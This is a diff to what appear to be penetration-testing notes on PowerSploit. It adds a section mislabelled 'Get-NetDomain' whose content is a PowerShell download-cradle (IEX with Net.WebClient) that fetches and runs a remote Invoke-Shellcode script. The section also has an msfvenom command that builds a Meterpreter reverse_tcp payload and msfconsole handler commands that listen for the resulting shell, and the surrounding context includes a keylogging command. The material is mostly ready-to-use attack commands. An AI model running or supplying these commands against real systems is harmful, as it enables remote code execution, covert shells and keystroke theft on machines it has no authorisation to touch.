@@ -135,7 +135,24 @@ Get-Keystrokes -LogPath C:\temp\keylog.txt    //The target machine executes the 
 
 - [Powersploit的安装及脚本攻击实战](https://www.cnblogs.com/zhengna/p/12186118.html)
 
-## 5.3 Powersploit
+## 5.3 Get-NetDomain
+```
+IEX (New-Object Net.WebClient).DownloadString("http://IP/Invoke-Shellcode.ps1")    //Remote script loading
+```
+```
+msfvenom -p windows/meterpreter/reverse_tcp \LHOST=IP \LPORT=443 \-f powershell \-o shellcode.ps1    //Create a shell script
+```
+```
+msfconsole -q    //start msfconsole
+use exploit/multi/handler  //Load multiprocessing module
+//Configure loads and parameters consistent with Shellcode
+set payload windows/meterpreter/reverse_tcp
+set LHOST IP
+set LPORT 443
+//Enable listening (continuously waiting for the session)
+run
+```
+<img width="828" height="279" alt="image" src="https://github.com/user-attachments/assets/d20cdb51-b512-4f97-b7ed-ac99e588fe6d" />
 
 ### 6 Webshells
 ### 7 Weevely
